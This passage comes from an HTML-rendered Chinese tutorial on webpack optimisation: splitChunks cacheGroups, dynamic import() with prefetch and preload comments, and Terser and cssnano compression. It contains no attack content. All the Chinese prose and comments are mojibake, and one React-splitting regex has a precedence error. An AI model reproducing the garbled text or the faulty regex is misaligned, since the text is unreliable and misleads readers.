class="hljs-attr">cacheGroups</span>: &#123;<br>      <span class="hljs-comment">// 1. åˆ†ç¦»ç¬¬ä¸‰æ–¹åº“</span><br>      <span class="hljs-attr">vendors</span>: &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>, <span class="hljs-comment">// è·¯å¾„åŒ¹é…</span><br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;vendors&#x27;</span>,                  <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶å</span><br>        <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span>,                    <span class="hljs-comment">// è¦†ç›–å…¨å±€chunksè®¾ç½®</span><br>        <span class="hljs-attr">priority</span>: <span class="hljs-number">10</span>,                     <span class="hljs-comment">// ä¼˜å…ˆçº§ï¼ˆæ•°å­—è¶Šå¤§è¶Šä¼˜å…ˆï¼‰</span><br>        <span class="hljs-attr">reuseExistingChunk</span>: <span class="hljs-literal">true</span>          <span class="hljs-comment">// é‡ç”¨å·²å­˜åœ¨chunk</span><br>      &#125;,<br>      <span class="hljs-comment">// 2. åˆ†ç¦»å…¬å…±æ¨¡å—ï¼ˆè¢«2ä¸ªä»¥ä¸Šchunkå¼•ç”¨ï¼‰</span><br>      <span class="hljs-attr">common</span>: &#123;<br>        <span class="hljs-attr">minChunks</span>: <span class="hljs-number">2</span>,                     <span class="hljs-comment">// æœ€å°å¼•ç”¨æ¬¡æ•°</span><br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;common&#x27;</span>,<br>        <span class="hljs-attr">priority</span>: <span class="hljs-number">5</span>,<br>        <span class="hljs-attr">minSize</span>: <span class="hljs-number">0</span>                        <span class="hljs-comment">// å…è®¸å°æ¨¡å—ï¼ˆå¦‚å·¥å…·å‡½æ•°ï¼‰</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é…ç½®ç­–ç•¥å®æˆ˜æŠ€å·§</strong></p><p>(1) chunks é€‰å‹ç­–ç•¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åœºæ™¯1ï¼šSPAåº”ç”¨ï¼ˆæ¨èï¼‰</span><br><span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span> <span class="hljs-comment">// åŒæ—¶ä¼˜åŒ–é¦–å±å’Œå¼‚æ­¥åŠ è½½</span><br><br><span class="hljs-comment">// åœºæ™¯2ï¼šå¤šé¡µåº”ç”¨ï¼ˆMPAï¼‰</span><br><span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;initial&#x27;</span> <span class="hljs-comment">// ä»…åˆ†å‰²å…¥å£å…¬å…±ä¾èµ–</span><br></code></pre></td></tr></table></figure><p>(2) ä½“ç§¯é˜ˆå€¼è°ƒä¼˜</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">minSize</span>: &#123;<br>  <span class="hljs-attr">javascript</span>: <span class="hljs-number">30000</span>,  <span class="hljs-comment">// JSæœ€å°30KB</span><br>  <span class="hljs-attr">style</span>: <span class="hljs-number">50000</span>        <span class="hljs-comment">// CSSæœ€å°50KB</span><br>&#125;,<br><span class="hljs-attr">maxSize</span>: <span class="hljs-number">150000</span>,      <span class="hljs-comment">// å°è¯•æ‹†åˆ†å¤§äº150KBçš„åŒ…</span><br></code></pre></td></tr></table></figure><p>(3) cacheGroups é«˜çº§ç”¨æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ†ç¦»æŒ‡å®šæ¡†æ¶ï¼ˆå¦‚Reactï¼‰</span><br><span class="hljs-attr">react</span>: &#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]react|react-dom[\\/]/</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;react-core&#x27;</span>,<br>  <span class="hljs-attr">priority</span>: <span class="hljs-number">20</span>  <span class="hljs-comment">// é«˜äºé»˜è®¤vendors</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰ç›®å½•ç»“æ„åˆ†ç»„</span><br><span class="hljs-attr">utils</span>: &#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]src[\\/]utils[\\/]/</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;shared-utils&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§ä¼˜åŒ–åœºæ™¯è§£å†³æ–¹æ¡ˆ</strong></p><table><thead><tr><th align="left">é—®é¢˜ç°è±¡</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">é¦–å±åŠ è½½æ…¢</td><td align="left">æé«˜ minSize é¿å…è¿‡å°åŒ…ï¼Œå¢å¤§ maxInitialRequests</td></tr><tr><td align="left">å…¬å…±æ¨¡å—é‡å¤æ‰“åŒ…</td><td align="left">è®¾ç½® minChunks: 2 + cacheGroups.common</td></tr><tr><td align="left">Lodashç­‰å·¥å…·åº“æœªå•ç‹¬æ‹†åˆ†</td><td align="left">åœ¨ cacheGroups æ·»åŠ ä¸“å±è§„åˆ™ï¼ˆtest: &#x2F;lodash&#x2F;ï¼‰</td></tr><tr><td align="left">å¼‚æ­¥åŠ è½½çš„ç»„ä»¶åº“ä½“ç§¯è¿‡å¤§</td><td align="left">é…ç½® maxAsyncRequests: 10 é™åˆ¶å¹¶å‘è¯·æ±‚æ•°</td></tr></tbody></table><p><strong>é…ç½®ä¼˜å…ˆçº§è§„åˆ™</strong></p><p>æ¨¡å—åŒ¹é…é¡ºåºï¼š</p><pre class="mermaid">graph TB  A[æ¨¡å—] --> B{æ˜¯å¦åŒ¹é… cacheGroups è§„åˆ™?}  B -->|æ˜¯| C[æŒ‰ priority é€‰æ‹©æœ€é«˜ä¼˜å…ˆçº§ç»„]  B -->|å¦| D[åº”ç”¨å…¨å±€ splitChunks é…ç½®]</pre><p>å†²çªå¤„ç†åŸåˆ™ï¼š</p><ul><li>priority å†³å®šè§„åˆ™ä¼˜å…ˆçº§</li><li>åŒæ—¶åŒ¹é…å¤šè§„åˆ™æ—¶ï¼Œé€‰æ‹© priority å€¼æ›´å¤§çš„ç»„</li><li>æœªåŒ¹é…ä»»ä½•ç»„æ—¶å›é€€åˆ°å…¨å±€é…ç½®</li></ul><p><strong>é¢è¯•é«˜é¢‘é—®é¢˜</strong></p><p>(1) å¦‚ä½•é¿å…åˆ†å‰²å‡ºè¿‡å¤šå°æ–‡ä»¶ï¼Ÿ</p><p>åˆç†è®¾ç½® minSizeï¼ˆæ¨è30KB+ï¼‰å’Œ maxAsyncRequestsï¼ˆå»ºè®®5-10ï¼‰ï¼Œå¹¶å¯ç”¨ reuseExistingChunk</p><p>(2) åŒæ­¥æ¨¡å—(initial)å’Œå¼‚æ­¥æ¨¡å—(async)åˆ†å‰²çš„åŒºåˆ«ï¼Ÿ</p><p>åŒæ­¥åˆ†å‰²å½±å“é¦–å±è¯·æ±‚æ•°ï¼Œéœ€é…åˆ maxInitialRequests æ§åˆ¶ï¼›å¼‚æ­¥åˆ†å‰²ä¼˜åŒ–åŠ¨æ€åŠ è½½æ€§èƒ½</p><p>(3) ä¸ºä»€ä¹ˆé…ç½®äº† minChunks: 2 ä½†å…¬å…±æ¨¡å—æœªåˆ†ç¦»ï¼Ÿ</p><p>æ’æŸ¥ç‚¹ï¼š</p><ul><li>æ¨¡å—ä½“ç§¯æ˜¯å¦å°äº minSize</li><li>æ˜¯å¦è¢«æ›´é«˜ä¼˜å…ˆçº§è§„åˆ™åŒ¹é…</li><li>chunks èŒƒå›´æ˜¯å¦åŒ…å«è¯¥æ¨¡å—ç±»å‹</li></ul><h3 id="3-2-3-åŠ¨æ€åŠ è½½ï¼šimport-è¯­æ³•ä¸Prefetch-Preload"><a href="#3-2-3-åŠ¨æ€åŠ è½½ï¼šimport-è¯­æ³•ä¸Prefetch-Preload" class="headerlink" title="3.2.3 åŠ¨æ€åŠ è½½ï¼šimport()è¯­æ³•ä¸Prefetch&#x2F;Preload"></a>3.2.3 åŠ¨æ€åŠ è½½ï¼š<code>import()</code>è¯­æ³•ä¸Prefetch&#x2F;Preload</h3><p><strong>åŸºç¡€è¯­æ³•ä¸åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. åŸºç¡€åŠ¨æ€å¯¼å…¥</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./module.js&#x27;</span>)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">doSomething</span>())<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;åŠ è½½å¤±è´¥&#x27;</span>, err));<br>&#125;);<br><br><span class="hljs-comment">// 2. ç»“åˆasync/await</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">loadModule</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; export1, export2 &#125; = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./module.js&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ç»“æœï¼š<br>Webpack ä¼šå°†åŠ¨æ€å¯¼å…¥æ¨¡å—æ‹†åˆ†ä¸ºç‹¬ç«‹ chunkï¼ˆå¦‚ 1.bundle.jsï¼‰ï¼Œå¹¶è‡ªåŠ¨æ³¨å…¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è¿è¡Œæ—¶ç”Ÿæˆçš„åŠ è½½é€»è¾‘</span><br>__webpack_require__.<span class="hljs-title function_">e</span>(<span class="hljs-comment">/*! import() */</span> <span class="hljs-number">1</span>)<br>  .<span class="hljs-title function_">then</span>(__webpack_require__.<span class="hljs-title function_">bind</span>(<span class="hljs-number">1</span>))<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> ...)<br></code></pre></td></tr></table></figure><p><strong>é­”æ³•æ³¨é‡Šï¼ˆMagic Commentsï¼‰</strong></p><p>é€šè¿‡æ³¨é‡Šä¼ é€’é…ç½®å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span>(<br>  <span class="hljs-comment">/* webpackChunkName: &quot;chartjs&quot; */</span><br>  <span class="hljs-comment">/* webpackPrefetch: true */</span><br>  <span class="hljs-comment">/* webpackPreload: true */</span><br>  <span class="hljs-comment">/* webpackMode: &quot;lazy-once&quot; */</span><br>  <span class="hljs-string">&#x27;./chart&#x27;</span><br>)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">æ³¨é‡ŠæŒ‡ä»¤</th><th align="left">ä½œç”¨</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">webpackChunkName</td><td align="left">æŒ‡å®šç”Ÿæˆchunkçš„åç§°ï¼ˆæ”¯æŒå ä½ç¬¦[name]ï¼‰</td><td align="left">åˆ†ç»„åŒç±»æ¨¡å—</td></tr><tr><td align="left">webpackPrefetch</td><td align="left">é¢„å–ï¼šç©ºé—²æ—¶åŠ è½½èµ„æºï¼ˆä¼˜å…ˆçº§ä½ï¼‰</td><td align="left">æœªæ¥å¯èƒ½éœ€è¦çš„åŠŸèƒ½ï¼ˆå¦‚ä¸‹é¡µï¼‰</td></tr><tr><td align="left">webpackPreload</td><td align="left">é¢„åŠ è½½ï¼šä¸çˆ¶æ¨¡å—å¹¶è¡ŒåŠ è½½ï¼ˆä¼˜å…ˆçº§é«˜ï¼‰</td><td align="left">é¦–å±å…³é”®å¼‚æ­¥ç»„ä»¶</td></tr><tr><td align="left">webpackMode</td><td align="left">åŠ è½½æ¨¡å¼ï¼šlazy(é»˜è®¤)&#x2F;eager(ä¸åˆ†ç¦»chunk)&#x2F;lazy-once(ç»Ÿä¸€chunk)</td><td align="left">ç‰¹æ®ŠåŠ è½½éœ€æ±‚</td></tr></tbody></table><p><strong>Prefetch vs Preload æ ¸å¿ƒå·®å¼‚</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">prefetch</th><th align="left">preload</th></tr></thead><tbody><tr><td align="left">åŠ è½½æ—¶æœº</td><td align="left">æµè§ˆå™¨ç©ºé—²æ—¶</td><td align="left">ç«‹å³ä¸çˆ¶æ¨¡å—å¹¶è¡ŒåŠ è½½</td></tr><tr><td align="left">ä¼˜å…ˆçº§</td><td align="left">Low</td><td align="left">High</td></tr><tr><td align="left">æ‰§è¡Œé¡ºåº</td><td align="left">ä¸»æµç¨‹å®Œæˆå</td><td align="left">é˜»å¡çˆ¶æ¨¡å—æ¸²æŸ“</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">éå…³é”®åŠŸèƒ½ï¼ˆå¦‚å¼¹çª—&#x2F;ä¸‹é¡µå†…å®¹ï¼‰</td><td align="left">å…³é”®å¼‚æ­¥è·¯ç”±&#x2F;é¦–å±å¿…è¦ç»„ä»¶</td></tr><tr><td align="left">HTTPå¤´</td><td align="left"><code>&lt;link rel=&quot;prefetch&quot; href=&quot;...&quot;&gt;</code></td><td align="left"><code>&lt;link rel=&quot;preload&quot; href=&quot;...&quot;&gt;</code></td></tr></tbody></table><p>é”™è¯¯ç”¨æ³•è­¦ç¤ºï¼š<br>æ»¥ç”¨ preload ä¼šå¯¼è‡´å…³é”®èµ„æºè¢«æŠ¢å ï¼Œåè€Œå»¶é•¿é¦–å±æ—¶é—´</p><p><strong>å·¥ç¨‹åŒ–æœ€ä½³å®è·µ</strong></p><p>(1) è·¯ç”±çº§ä»£ç åˆ†å‰²ï¼ˆReact&#x2F;Vueï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React + React.lazy</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductPage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./ProductPage&#x27;</span>)<br>);<br><br><span class="hljs-comment">// Vue å¼‚æ­¥ç»„ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">UserProfile</span> = (<span class="hljs-params"></span>) =&gt; (&#123;<br>  <span class="hljs-attr">component</span>: <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;profile&quot; */</span> <span class="hljs-string">&#x27;./UserProfile.vue&#x27;</span>),<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span> <span class="hljs-comment">// å»¶è¿Ÿå±•ç¤ºloadingæ—¶é—´</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) ç»„ä»¶åº“æŒ‰éœ€åŠ è½½</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç‚¹å‡»æ—¶åŠ è½½å¯Œæ–‡æœ¬ç¼–è¾‘å™¨</span><br>editButton.<span class="hljs-property">onclick</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;editor&quot; */</span> <span class="hljs-string">&#x27;tinymce&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">editor</span> =&gt;</span> &#123;<br>    editor.<span class="hljs-title function_">init</span>();<br>  &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) é¢„å–ç­–ç•¥ä¼˜åŒ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é¡µé¢åŠ è½½å®Œæˆåé¢„å–ä¸‹é¡µèµ„æº</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./next-page-module.js&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æŒ‡æ ‡å…³è”</strong></p><table><thead><tr><th align="left">ä¼˜åŒ–æ‰‹æ®µ</th><th align="left">å½±å“çš„æ ¸å¿ƒæŒ‡æ ‡</th></tr></thead><tbody><tr><td align="left">åŸºç¡€åŠ¨æ€å¯¼å…¥</td><td align="left">å‡å°‘FCPæ—¶é—´ï¼ˆé¦–æ¬¡å†…å®¹ç»˜åˆ¶ï¼‰</td></tr><tr><td align="left">Prefetch</td><td align="left">æå‡LCPï¼ˆæœ€å¤§å†…å®¹ç»˜åˆ¶ï¼‰åçš„äº¤äº’ä½“éªŒ</td></tr><tr><td align="left">Preload</td><td align="left">ä¼˜åŒ–LCPæœ¬èº«ï¼ˆå…³é”®å†…å®¹åŠ è½½ï¼‰</td></tr><tr><td align="left">åˆç†æ‹†åˆ†chunk</td><td align="left">é™ä½TBTï¼ˆæ€»é˜»å¡æ—¶é—´ï¼‰</td></tr></tbody></table><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>Q1ï¼šåŠ¨æ€åŠ è½½çš„chunkæ–‡ä»¶è¿‡å¤šå¯¼è‡´HTTP&#x2F;2é˜»å¡ï¼Ÿ</p><p>æ–¹æ¡ˆï¼šåˆå¹¶å°æ–‡ä»¶ + åŸŸååˆ†ç‰‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»Ÿä¸€å‘½ååˆå¹¶åŒç±»æ¨¡å—</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;utils-[request]&quot; */</span> <span class="hljs-string">`./utils/<span class="hljs-subst">$&#123;file&#125;</span>`</span>)<br></code></pre></td></tr></table></figure><p>Q2ï¼šå¦‚ä½•æ•è·åŠ è½½å¤±è´¥ï¼Ÿ</p><p>æ–¹æ¡ˆï¼šæ·»åŠ é”™è¯¯è¾¹ç•Œï¼ˆReactï¼‰ + é‡è¯•æœºåˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Reacté”™è¯¯è¾¹ç•Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isChunkLoadError</span>(error)) <span class="hljs-title function_">retryLoading</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Q3ï¼šé¢„å–èµ„æºè¿‡æ—©å½±å“é¦–å±ï¼Ÿ</p><p>æ–¹æ¡ˆï¼šåŠ¨æ€è®¡ç®—è§¦å‘æ—¶æœº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç½‘ç»œé€Ÿåº¦å»¶è¿Ÿé¢„å–</span><br><span class="hljs-keyword">if</span> (navigator.<span class="hljs-property">connection</span>.<span class="hljs-property">saveData</span> === <span class="hljs-literal">false</span>) &#123;<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">prefetchModule</span>(), <span class="hljs-number">10000</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-4-èµ„æºå‹ç¼©ï¼šTerserå¤šè¿›ç¨‹å‹ç¼©-CSS-cssnano"><a href="#3-2-4-èµ„æºå‹ç¼©ï¼šTerserå¤šè¿›ç¨‹å‹ç¼©-CSS-cssnano" class="headerlink" title="3.2.4 èµ„æºå‹ç¼©ï¼šTerserå¤šè¿›ç¨‹å‹ç¼© &#x2F; CSS cssnano"></a>3.2.4 èµ„æºå‹ç¼©ï¼šTerserå¤šè¿›ç¨‹å‹ç¼© &#x2F; CSS <code>cssnano</code></h3><p><strong>JavaScriptå‹ç¼©ï¼šTerseræ ¸å¿ƒæœºåˆ¶</strong></p><p>Terserï¼ˆWebpack 5+é»˜è®¤ï¼‰æ›¿ä»£UglifyJSï¼Œæ”¯æŒES6+è¯­æ³•å‹ç¼©ï¼Œé…ç½®ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">minimizer</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>      <span class="hljs-attr">parallel</span>: <span class="hljs-literal">true</span>,         <span class="hljs-comment">// å¯ç”¨å¤šè¿›ç¨‹ï¼ˆé»˜è®¤CPUæ•°-1ï¼‰</span><br>      <span class="hljs-attr">extractComments</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ä¸æå–æ³¨é‡Šåˆ°å•ç‹¬æ–‡ä»¶</span><br>      <span class="hljs-attr">terserOptions</span>: &#123;<br>        <span class="hljs-attr">compress</span>: &#123;<br>          <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// ç§»é™¤console</span><br>          <span class="hljs-attr">pure_funcs</span>: [<span class="hljs-string">&#x27;alert&#x27;</span>], <span class="hljs-comment">// åˆ é™¤æŒ‡å®šå‡½æ•°</span><br>        &#125;,<br>        <span class="hljs-attr">format</span>: &#123;<br>          <span class="hljs-attr">comments</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// ç§»é™¤æ‰€æœ‰æ³¨é‡Š</span><br>        &#125;,<br>        <span class="hljs-attr">mangle</span>: &#123;<br>          <span class="hljs-attr">properties</span>: &#123;<br>            <span class="hljs-attr">regex</span>: <span class="hljs-regexp">/^_/</span>,        <span class="hljs-comment">// æ··æ·†ä»¥_å¼€å¤´çš„ç§æœ‰å±æ€§</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;)<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®é…ç½®é¡¹è§£æï¼š</p><table><thead><tr><th align="left">ç±»åˆ«</th><th align="left">é€‰é¡¹</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">å‹ç¼©</td><td align="left">drop_console<br>dead_code<br>reduce_vars</td><td align="left">åˆ é™¤æ‰€æœ‰console.*è°ƒç”¨<br>ç§»é™¤ä¸å¯è¾¾ä»£ç ï¼ˆéœ€é…åˆTree Shakingï¼‰<br>å˜é‡å¤ç”¨ï¼ˆå°†é‡å¤å˜é‡åˆå¹¶ï¼‰</td></tr><tr><td align="left">æ··æ·†</td><td align="left">mangle<br>mangle.properties</td><td align="left">å˜é‡åç¼©çŸ­ï¼ˆé»˜è®¤å¯ç”¨ï¼‰<br>æ··æ·†å¯¹è±¡å±æ€§åï¼ˆæ…ç”¨ï¼å¯èƒ½ç ´åä»£ç é€»è¾‘ï¼‰</td></tr><tr><td align="left">æ ¼å¼</td><td align="left">comments</td><td align="left">ä¿ç•™ç‰¹å®šæ³¨é‡Šï¼ˆå¦‚@licenseï¼‰</td></tr></tbody></table><p><strong>CSSå‹ç¼©ï¼šcssnanoé«˜çº§ç­–ç•¥</strong></p><p>cssnanoï¼ˆé€šè¿‡css-minimizer-webpack-pluginé›†æˆï¼‰æä¾›æ™ºèƒ½æ ·å¼å‹ç¼©ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">CssMinimizerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;css-minimizer-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimizer</span>: [<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">CssMinimizerPlugin</span>(&#123;<br>        <span class="hljs-attr">parallel</span>: <span class="hljs-number">4</span>, <span class="hljs-comment">// æŒ‡å®š4ä¸ªè¿›ç¨‹</span><br>        <span class="hljs-attr">minimizerOptions</span>: &#123;<br>          <span class="hljs-attr">preset</span>: [<br>            <span class="hljs-string">&#x27;advanced&#x27;</span>, <span class="hljs-comment">// å¯ç”¨é«˜çº§ä¼˜åŒ–</span><br>            &#123; <br>              <span class="hljs-attr">discardComments</span>: &#123; <span class="hljs-attr">removeAll</span>: <span class="hljs-literal">true</span> &#125;,<br>              <span class="hljs-attr">normalizeUrl</span>: &#123; <span class="hljs-attr">stripWWW</span>: <span class="hljs-literal">false</span> &#125; <span class="hljs-comment">// ä¿ç•™wwwåŸŸå</span><br>            &#125;<br>          ]<br>        &#125;<br>      &#125;)<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>cssnanoä¼˜åŒ–è§„åˆ™ç¤ºä¾‹ï¼š</p><table><thead><tr><th align="left">ä¼˜åŒ–ç±»å‹</th><th align="left">åŸå§‹æ ·å¼</th><th align="left">å‹ç¼©å</th><th align="left">èŠ‚çœå­—èŠ‚</th></tr></thead><tbody><tr><td align="left">é¢œè‰²ç®€åŒ–</td><td align="left">color: #ff0000;</td><td align="left">color:red;</td><td align="left">6 bytes</td></tr><tr><td align="left">å•ä½ç®€åŒ–</td><td align="left">padding: 0px 10px;</td><td align="left">padding:0 10px;</td><td align="left">2 bytes</td></tr><tr><td align="left">åˆå¹¶é‡å¤</td><td align="left">margin:10px; margin:5px</td><td align="left">margin:5px</td><td align="left">11 bytes</td></tr><tr><td align="left">åˆ é™¤è¿‡æ—¶å‰ç¼€</td><td align="left">-webkit-border-radius</td><td align="left">border-radius</td><td align="left">9 